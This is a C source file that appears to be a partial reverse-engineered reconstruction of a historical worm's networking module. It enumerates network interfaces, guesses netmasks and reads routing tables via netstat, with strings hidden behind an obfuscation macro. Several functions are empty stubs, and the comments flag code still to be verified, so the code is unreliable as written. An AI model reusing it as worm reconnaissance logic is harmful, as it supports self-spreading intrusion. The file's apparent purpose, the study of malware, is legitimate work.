/* dover */

#include "worm.h"
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>

/* This is the second of five source files linked together to form the '.o'
 * file distributed with the worm.
 */

if_init()			/* 0x254c, check again */
{
    struct ifconf if_conf;
    struct ifreq if_buffer[12];
    int  s, i, num_ifs, j;
    char local[48];
    
    nifs = 0;
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
	return 0;				/* if_init+1042 */
    if_conf.ifc_req = if_buffer;
    if_conf.ifc_len = sizeof(if_buffer);
    
    if (ioctl(s, SIOCGIFCONF, &if_conf) < 0) {
	close(s);
	return 0;				/* if_init+1042 */
    }
    
    num_ifs = if_conf.ifc_len/sizeof(if_buffer[0]);
    for(i = 0; i < num_ifs; i++) {		/* if_init+144 */
	for (j = 0; j < nifs; j++)
	    /* Oops, look again.  This line needs verified. */
	    if (strcmp(ifs[j], if_buffer[i].ifr_name) == 0)
		break;
    }
    
}	

/* Yes all of these are in the include file, but why bother?  Everyone knows
   netmasks, and they will never change... */
def_netmask(net_addr)				/* 0x2962 */
     int net_addr;
{
    if ((net_addr & 0x80000000) == 0)
	return 0xFF000000;
    if ((net_addr & 0xC0000000) == 0xC0000000)
	return 0xFFFF0000;
    return 0xFFFFFF00;
}

netmaskfor(addr)				/* 0x29aa */
     int addr;
{
    int i, mask;
    
    mask = def_netmask(addr);
    for (i = 0; i < nifs; i++)
	if ((addr & mask) == (ifs[i].if_l16 & mask))
	    return ifs[i].if_l24;
    return mask;
}

rt_init()					/* 0x2a26 */
{
    FILE *pipe;
    char input_buf[64];
    int	 l204, l304;
    
    ngateways = 0;
    pipe = popen(XS("/usr/ucb/netstat -r -n"), XS("r"));
   						 /* &env102,&env 125 */
    if (pipe == 0)
	return 0;
    while (fgets(input_buf, sizeof(input_buf), pipe)) { /* to 518 */
	other_sleep(0);
	if (ngateways >= 500)
	    break;
	sscanf(input_buf, XS("%s%s"), l204, l304);	/* <env+127>"%s%s" */
	/* other stuff, I'll come back to this later */
	
	
    }						/* 518, back to 76 */
    pclose(pipe);
    rt_init_plus_544();
    return 1;
}						/* 540 */

static rt_init_plus_544()				/* 0x2c44 */
{
}

getaddrs()					/* 0x2e1a */
{
}

struct bar *a2in(a)		/* 0x2f4a, needs to be fixed */
     int a;
{
    static struct bar local;
    local.baz = a;
    return &local;
}

/* End of source file in original. */

/*
 * Local variables:
 * compile-command: "cc -S net.c"
 * comment-column: 48
 * End:
 */
